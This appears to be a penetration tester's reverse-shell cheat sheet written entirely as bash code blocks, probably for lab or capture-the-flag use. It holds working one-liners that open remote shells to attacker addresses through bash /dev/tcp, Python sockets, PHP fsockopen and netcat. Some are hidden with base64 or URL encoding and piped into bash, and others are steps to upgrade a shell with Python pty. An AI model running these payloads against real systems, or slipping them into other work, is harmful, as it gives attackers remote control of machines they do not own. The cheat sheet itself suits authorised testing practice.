```Bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'

echo L2Jpbi9iYXNoIC1jIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNy85MDAxIDA+JjEK | base64 -d |bash

# url encoding
%2fbin%2fbash%20-c%20'bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.45.237%2f9001%200%3e%261'
```

```Bash
echo -n '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.7/9001 0>&1"' | base64   

```

```Bash
echo L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjcvOTAwMSAwPiYxIg== | base64 -d |bash
```

  

```Bash


python -c 'import pty;pty.spawn("/bin/bash")' \#get a better shell use python

export TERM=XTREM
ctlr+z 

```

```Bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.settimeout(10);s.connect(("10.10.14.7",9901));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```Bash
php -r '$sock=fsockopen("10.10.14.7",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

star a shell to kali from target

```Bash
bash -i >& /dev/tcp/192.168.10.10/9001 0>&1
```

```Bash
nc -e /bin/sh 10.10.14.53 1234'
```